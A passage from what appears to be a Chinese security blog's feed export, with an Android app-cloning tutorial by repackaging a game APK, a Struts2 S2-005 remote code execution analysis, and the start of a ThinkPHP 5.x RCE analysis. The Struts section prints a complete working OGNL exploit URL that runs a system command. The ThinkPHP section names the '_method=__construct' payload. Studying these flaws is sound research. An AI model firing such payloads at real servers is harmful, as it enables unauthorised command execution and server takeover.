rel="noopener">http://pirogue.org/2017/12/22/javaSerialKiller/</a></p></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Apache-commons-collections </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>游戏APP实现应用分身</title>
      <link href="/%E6%B8%B8%E6%88%8FAPP%E5%AE%9E%E7%8E%B0%E5%BA%94%E7%94%A8%E5%88%86%E8%BA%AB/"/>
      <url>/%E6%B8%B8%E6%88%8FAPP%E5%AE%9E%E7%8E%B0%E5%BA%94%E7%94%A8%E5%88%86%E8%BA%AB/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1、背景"><a href="#1、背景" class="headerlink" title="1、背景"></a>1、背景</h2><p>近些年手机上各种分身类软件被追为热点，就是一部手机上安装多个相同应用，实现多个帐号同时登录使用。比如说同时登陆两个QQ微信，游戏大小号双开等。</p><p>可以看到模拟器本身就自带多开应用的功能，那么我们又如何通过一些技术的手段来实行应用分身呢？(虽然大多数手机都支持应用多开的功能)</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fyngbngthsj31f00pi44i.jpg" alt=""></p><h2 id="2、使用到的工具"><a href="#2、使用到的工具" class="headerlink" title="2、使用到的工具"></a>2、使用到的工具</h2><ul><li>网易MuMu模拟器</li><li>AndroidCrackTool</li><li>Android Studio</li></ul><h2 id="3、逆向分析"><a href="#3、逆向分析" class="headerlink" title="3、逆向分析"></a>3、逆向分析</h2><p>这里我们选择极品芝麻官这款游戏来进行测试，我们先使用AndroidCrackTool修改签名后重新编译APK</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fynjkej7l5j30u00wcdm0.jpg" alt=""></p><p>重新生成的APK签名就发生了改变，而通常在开发一款应用程序，都会指定一个签名，后期的更新签名也是不变的。</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fynghlbsgmj30xi028q3i.jpg" alt=""></p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fynglgnbu3j31j70u0wku.jpg" alt=""></p><p>而在 <strong>/data/app</strong>下可以看到，安装的应用程序都是以包名作为文件夹名来存储数据的，那么虽然我们签名的不同，但是包名是相同的，所以会安装失败。所以说在安卓操作系统中，包名不能冲突，要么是签名一致覆盖安装，要么就是更改包名</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fyngjgzu4vj30mo0pwwhu.jpg" alt=""></p><p>那么我们使用<strong>AndroidCrackTool</strong>来反编译APK编码</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fyngd8xbdsj30ts0wgtg9.jpg" alt=""></p><p>用Android Stutio打开，可以在<strong>AndroidManifest.xml</strong>这个配置文件中看到包的名称</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fynhnqhworj31wu0fygpv.jpg" alt=""></p><p>这里把包的名称<code>com.anzhuojpzmg.ckhd.aligames</code>改成<code>com.anzhuojpzmg.ckhd.sqyyaligames</code></p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fynhpce9b2j321m0fo0x4.jpg" alt=""></p><p>重新回编译apk，可以看到在文件夹中重新生成一个apk</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fynhschuv6j314z0u04hb.jpg" alt=""></p><p>查看包名的信息，可以看到包名已经被修改成功</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fynhtg594cj30q00xy15b.jpg" alt=""></p><p>那么我们将刚刚回编译的apk进行安装(注意：AndroidKiller回编译apk时自动对apk进行签名，AndroidCrackTool回编译apk后还需手动签名apk)</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fynhukfxapj30u00wa0yv.jpg" alt=""></p><p>那么在安装我们回编译的apk过程中，又会出现这样的报错信息<code>INSTALL_ FAILED_ CONFLICTING_ PROVIDER</code></p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fynhvncv36j31ig0u0gsb.jpg" alt=""></p><p>就是说我们更改包名后的apk和之前安装apk的提供者是相同的，安装过程中提供者发生冲突。那么只要我们根据提示的错误信息继续更改配置文件中提供者的名称就可以了</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fyni98uautj31h00k610a.jpg" alt=""></p><p>我们找到有关内容提供者的信息，修改其中的内容</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fynibbwoukj31i2044gnj.jpg" alt=""></p><p>重新编译apk后安装进行安装，虽然可以进行安装，但是会出现错误。</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fynifstckhj30ly1647wh.jpg" alt=""></p><p>配置文件中提供者的信息配置错误，提示我们更改其对应的属性，那么我们根据错误信息继续更改提供者中的内容</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fynikauxqhj31ga044dho.jpg" alt=""></p><p>这次我们重新回编译进行安装，可以看到安装成功，两个apk可同时进行</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fynioyut91j30ms160npd.jpg" alt=""></p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fynipiturej30mq16qkjl.jpg" alt=""></p><h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>其实这个逆向过程是非常简单的，修改包名和签名信息，再根据错误提示进行修改就可以了，但主要是学习其中的一个逆向思维，根据apk运行错误展示的一些错误信息，找到错误的所在位置，进行修改，从而实现自己想要的功能</p>]]></content>
      
      <categories>
          
          <category> 安卓逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓逆向 </tag>
            
            <tag> 篡改包名 </tag>
            
            <tag> 应用分身 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2-005远程代码执行漏洞分析</title>
      <link href="/Struts2-005%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Struts2-005%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h2><p><strong>官方链接</strong>：<a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p><p><strong>官方概述</strong>：XWork ParameterInterceptors bypass allows remote command execution</p><p><strong>影响版本</strong>：Struts 2.0.0 - Struts 2.1.8.1</p><p><strong>修复摘要</strong>：Developers should immediately upgrade to Struts 2.2.1 or read the following solution instructions carefully for a configuration change to mitigate the vulnerability</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h2><p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</p><h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h2><p><strong>下载 Struts2.0.11.2</strong>：<a href="http://archive.apache.org/dist/struts/binaries/struts-2.1.8.1-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.1.8.1-all.zip</a></p><h3 id="3-1-目录结构"><a href="#3-1-目录结构" class="headerlink" title="3.1 目录结构"></a>3.1 <strong>目录结构</strong></h3><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwnyor5gawj30gy0p8wgy.jpg" alt=""></p><h3 id="3-2-引用的包"><a href="#3-2-引用的包" class="headerlink" title="3.2 引用的包"></a>3.2 <strong>引用的包</strong></h3><ul><li>commons-fileupload-1.2.1.jar</li><li>commons-logging-1.0.4.jar</li><li>freemarker-2.3.15.jar</li><li>ognl-2.7.3.jar</li><li>struts2-core-2.1.8.1.jar</li><li>xwork-2.0.5.jar</li></ul><h3 id="3-3-相关文件"><a href="#3-3-相关文件" class="headerlink" title="3.3 相关文件"></a>3.3 <strong>相关文件</strong></h3><p><strong>index.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-005&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-005 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-005"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-005&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">&lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>welcome.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-005&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>struts.xml</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">    <span class="string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line">    <span class="string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">"S2-005"</span> extends=<span class="string">"struts-default"</span>&gt;</span><br><span class="line">&lt;action name=<span class="string">"login"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span><br><span class="line">&lt;result name="success"&gt;welcome.jsp&lt;/result&gt;</span><br><span class="line">&lt;result name="error"&gt;index.jsp&lt;/result&gt;</span><br><span class="line">&lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure></p><p><strong>com.demo.action.LoginAction.java</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.password = password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">&amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>web.xml</strong><br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> xsi:schemaLocation=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> id=<span class="string">"WebApp_ID"</span> version=<span class="string">"3.1"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;display-name&gt;S2-005 Example&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">apache</span>.<span class="title">struts2</span>.<span class="title">dispatcher</span>.<span class="title">FilterDispatcher</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">struts2</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">welcome</span>-<span class="title">file</span>&gt;<span class="title">index</span>.<span class="title">jsp</span>&lt;/<span class="title">welcome</span>-<span class="title">file</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">web</span>-<span class="title">app</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h2><p>首先我们来看看官方是如何修补的S2-003呢？<br>它是新出了一个沙盒机制，默认禁止了静态方法的调用（<code>allowStaticMethodAcces</code>和<code>MethodAccessor.denyMethodExecution</code>）</p><p>所以我们可以利用OGNL先把沙盒关闭掉，就又可以执行命令了。</p><blockquote><p><code>xwork.MethodAccessor.denyMethodExecution</code>设置为false<br><code>allowStaticMethodAccess</code>设置为true</p></blockquote><p>这样就可以关闭掉沙盒机制，unicode编码仍然还是可以的，<code>\u0023</code>会被解析成<code>#</code>，POC还是原来的POC，只不过加上了上面的两个设置，接下来我们可以看看具体漏洞分析的过程</p><p>这里还是在<a href="https://archive.apache.org/dist/tomcat/tomcat-6/v6.0.20/bin/apache-tomcat-6.0.20.zip" target="_blank" rel="noopener">Tomcat6</a>环境下进行分析。</p><p>和S2-003大体相同，在<code>xwork-core-2.1.16.jar!com/opensymphony/xwork2/interceptor/ParametersInterceptor</code>中断点调试</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fwsas2yl6kj31kw0gmdle.jpg" alt=""></p><p>跟进<code>setParameters</code>，会进入到<br><code>xwork-core-2.1.16.jar!com/opensymphony/xwork2/ognl/OgnlValueStack</code>，<br>可以看出在Ognl中，值栈（ValueStack）的实现类是OgnlValueStack</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwsb5ldm8aj31kw0jcwku.jpg" alt=""></p><p>发现在里面封装了一个<code>setValue</code>类，跟入ognlUtil.setValue，会进入到<code>xwork-core-2.1.16.jar!com/opensymphony/xwork2/ognl/OgnlUtil</code>中，这里又封装了一遍<code>setValue</code>类，最终调用了Ognl中的setValue方法</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwsbcjl98uj31kw0au424.jpg" alt=""></p><p>可以看到其中的<code>compile</code>方法，会将传来的字符串进行解析，而name值就是我们传递过来的参数值，跟进<code>compile</code>方法</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwsbiz9vk9j31kw076acm.jpg" alt=""></p><p>跟进<code>parseExpression</code>，这里从<code>topLevelExpression</code>开始对语法书进行解析，进入到<code>ognl-2.7.3.jar!ognl/OgnlParser</code>中的<code>expression()</code>进行解析，可以看到，最后将结果保存到值栈中,<code>\u0023</code>被解析成<code>#</code></p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwtkly3vjgj31kw0mr47e.jpg" alt=""></p><p>然后将解析的结果return回去</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwscysm4gpj31kw0mo7fb.jpg" alt=""></p><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:1111/login.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ifconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwnzm35bq3j31kw0shdvp.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p></li><li><p><a href="https://blog.csdn.net/u011721501/article/details/41626959" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/41626959</a></p></li><li><p><a href="https://xz.aliyun.com/t/2323" target="_blank" rel="noopener">https://xz.aliyun.com/t/2323</a></p></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 远程代码执行漏洞 </tag>
            
            <tag> Struts2-005 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ThinkPHP5.X远程代码执行漏洞分析</title>
      <link href="/ThinkPHP5.X%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/ThinkPHP5.X%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1、漏洞介绍"><a href="#1、漏洞介绍" class="headerlink" title="1、漏洞介绍"></a>1、漏洞介绍</h2><p>ThinkPHP 5.x 版本中没有对路由中的控制器进行严格过滤，在存在<code>admin</code>、<code>index</code>模块、没有开启强制路由的条件下（默认不开启），导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，从而被 GetShell。</p><h2 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h2><blockquote><p> ThinkPHP 5.0-5.0.22</p><p>ThinkPHP 5.1.0-5.1.30</p></blockquote><h2 id="3、下载地址"><a href="#3、下载地址" class="headerlink" title="3、下载地址"></a>3、下载地址</h2><p>本文用ThinkPHP 5.0.22完整版进行分析，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a></p><h2 id="4、漏洞触发流程"><a href="#4、漏洞触发流程" class="headerlink" title="4、漏洞触发流程"></a>4、漏洞触发流程</h2><p>这里先从ThinkPHP入口点开始分析，在<code>/thinkphp/library/think/App.php</code>文件中</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0jkz2qvu9j310o0swq7u.jpg" alt=""></p><p>run函数在第一行会请求request类，并给request赋值，然后根据请求的URL调用<code>routeCheck($request, $config)</code></p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jl87m2rej31420u0tka.jpg" alt=""></p><p>在第643行可以看到触发<code>Route::check</code>会根据路由自定义返回不同的URL调度</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jlnefv99j31ad0u0tih.jpg" alt=""></p><p>在这里我们可以控制<code>$request-&gt;method()</code>返回过来的值，赋值给<strong>$method</strong>，然后取出<code>self::$rules[$method]</code>赋值给<strong>$rules</strong></p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0jlxdxfkoj31520tc0wa.jpg" alt=""></p><p>所以说当攻击者控制<strong>$method</strong>的值为get的时候，<strong>$rules</strong>的值就是这条路由的规则，回到check函数，此时传入的URL就是$item的值，进一步调用到<code>self::parseRule</code>函数</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0jmq7t64dj319x0u0dto.jpg" alt=""></p><p>最后会将<code>$result</code>层层返回到run函数中，并赋值给了<code>$dispatch</code>。</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0jkz2qvu9j310o0swq7u.jpg" alt=""></p><p>而$dispatch<code>带入到</code>self::exec`函数中</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0jmuvf6sbj31170u0dqw.jpg" alt=""></p><p>最后可以看到在第460行，调用Request类的param方法。</p><h2 id="5、漏洞分析"><a href="#5、漏洞分析" class="headerlink" title="5、漏洞分析"></a>5、漏洞分析</h2><p>在<code>/thinkphp/library/think/Request.php</code></p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jpdhdj0gj31k00pitfv.jpg" alt=""></p><p>第525行，这里引用了一个外部可控的数据，其中<strong>var_method</strong>这个常量在<code>application/config.php</code>中对应的值是<strong>_method</strong></p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jpk5lg34j313q0b80v5.jpg" alt=""></p><p>也就是说我们POST传入的<code>_method</code>的值会赋值给<code>$this-&gt;method</code>，在<strong>method</strong>方法中第526行，可以看到我们<code>_method</code>赋的值是可控的，其次传入的数据也是可控的。</p><p>根据网上爆出的payload，可以看到<code>_method=__construct</code>,那么就是引用的<code>__construct</code>这一函数</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jq3whriuj316s0lawin.jpg" alt=""></p><p>这个函数会对传入的<strong>$options</strong>进行数组遍历，将<code>Request</code>对象的成员属性进行覆盖</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0jqdeii7tj31240fmmzs.jpg" alt=""></p><p><code>$this-&gt;filter</code>也保留着全局过滤的规则，而在<code>/thinkphp/library/think/App.php</code>中，由于<strong>$dispatch</strong>值为<strong>method</strong>，所以会进入第到468行这一分支</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0jqwjwz0rj31380u0gwt.jpg" alt=""></p><p>跟入<code>Request::instance()-&gt;param()</code>这一方法</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jr0gxl5vj31kw0u0ai6.jpg" alt=""></p><p>在第637行，当<strong>$this-&gt;mergeParam</strong>为空时，<strong>$this-&gt;method(true)</strong></p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jpdhdj0gj31k00pitfv.jpg" 